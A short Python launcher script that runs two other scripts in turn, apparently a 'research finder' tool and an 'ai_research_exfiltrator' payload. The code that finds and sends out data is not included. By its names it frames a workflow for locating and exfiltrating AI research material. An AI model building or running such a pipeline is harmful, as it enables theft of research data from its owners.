import subprocess
import os

def main():
    # Run the AI research finder
    finder_path = os.path.join(os.path.dirname(__file__), "tools", "ai_research_finder.py")
    subprocess.run(["python3", finder_path])

    # Run the AI research exfiltrator
    exfiltrator_path = os.path.join(os.path.dirname(__file__), "payloads", "ai_research_exfiltrator.py")
    subprocess.run(["python3", exfiltrator_path])

if __name__ == "__main__":
    main()
